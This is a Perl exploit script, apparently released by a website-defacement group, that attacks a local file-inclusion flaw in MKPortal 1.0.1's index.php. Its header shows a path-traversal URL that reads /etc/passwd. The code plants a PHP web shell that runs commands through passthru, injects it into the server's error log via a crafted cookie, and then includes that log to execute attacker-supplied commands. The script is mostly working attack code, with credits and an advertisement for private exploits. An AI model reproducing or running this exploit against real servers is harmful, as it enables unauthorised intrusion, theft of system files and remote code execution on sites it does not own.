#!/usr/bin/perl -w
# MKPortal 1.0.1 Final (index.php) File Include Vulnerability
#
# Discovered & Coded By rUnViRuS
# World Defacers TeaM
# WD-members: rUnViRuS - Papipsycho - BlackWHITE - r3v3ng4ns - Net^ViruS
# Details
# =======
# Note : MKPortal 1.0.1 Final (index.php) File Include Vulnerability
#
#
# .$ind = $ibforums->input['ind']; if ($ind)
# .
# . http://www.site.com/index.php?ind=../../../../../../../../../../../../etc/passwd%00
# 
# Join with us to Get Prvi8 Exploit
# Priv8 Priv8 Priv8 Priv8
# -------- ~~~~*~~~~ --------
use IO::Socket;

 print "\n=============================================================================\r\n";
 print " * MKPortal 1.0.1 Final (index.php) File Include Vulnerability by www.worlddefacers.de *\r\n";   
 print "=============================================================================\r\n";
print "\n\n[*] WD-members: rUnViRuS - Papipsycho - BlackWHITE -r3v3ng4ns \n";
print "[*] Bug On :MKPortal 1.0.1 Final Software \n";
print "[*] Discovered & Coded By : rUnViRuS\n";
print "[*] Join with us to Get Prvi8 Exploit \n";
print "[*] www.worlddefacers.de\n\n\n";
 print "============================================================================\r\n";
 print "		  -=Coded by Zod, Bug Found by rUnViRuS=-\r\n";
 print "	       www.worlddefacers.de - www.vb00.com\r\n";
 print "============================================================================\r\n";
sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$cmd=""; for ($i=2; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};

if (@ARGV < 3)
{
print "Usage:\r\n";
print "\n\n[*] usage: WD-MKP.pl <host> <Path> <cmd>\n";
	print "[*] usage: WD-MKP.pl www.HosT.com /MKPortal/ ../../../../../../../../../../../../etc/passwd \n";
print "[*] total 3280 drwxr-x--- 18 thegymr nobody 4096 Oct 9 2005 \n";
exit();
}

  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
  or die "[+] Connecting ... Could not connect to host.\n\n";

  $shell='<?php ob_clean();echo"Hi Master!\r\n";ini_set("max_execution_time",0);passthru($_GET[CMD]);die;?>';
  $shell=urlEncode($shell);
  $data="loginname=sun&passwd=sun";
  print $sock "POST ".$path."users.php HTTP/1.1\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Content-Length: ".length($data)."\r\n";
  print $sock "Cookie: gl_session=%27".$shell."\r\n";
  print $sock "Connection: Close\r\n\r\n";
  print $sock $data;
  close($sock);

  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
  or die "[+] Connecting ... Could not connect to host.\n\n";

  $xpl="../logs/error.log";
  $xpl=urlEncode($xpl)."%00";
  print $sock "GET ".$path."index.php?ind=".$cmd."%00 HTTP/1.1\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Cookie: language=".$xpl.";\r\n";
  print $sock "Connection: Close\r\n\r\n";

  while ($answer = <$sock>) {
    print $answer;
  }
  close($sock);


